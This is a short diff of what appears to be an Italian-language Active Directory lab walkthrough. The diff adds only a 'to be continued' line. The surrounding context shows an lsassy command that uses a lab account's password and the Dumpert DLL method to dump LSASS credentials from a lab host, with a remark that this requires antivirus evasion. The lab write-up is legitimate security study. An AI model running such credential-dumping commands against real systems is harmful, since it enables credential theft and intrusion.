@@ -235,3 +235,4 @@ Dumpare lsass flagga quasi sempre l'antivirus, devi fare una buona evasion per r
 ```bash
 lsassy -d north.sevenkingdoms.local -u jeor.mormont -p _L0ngCl@w_ 192.168.56.22 -m dumpertdll -O dumpertdll_path=Scrivania/Tools/Outflank-Dumpert-DLL.dll
 ```
+DA CONTINUARE
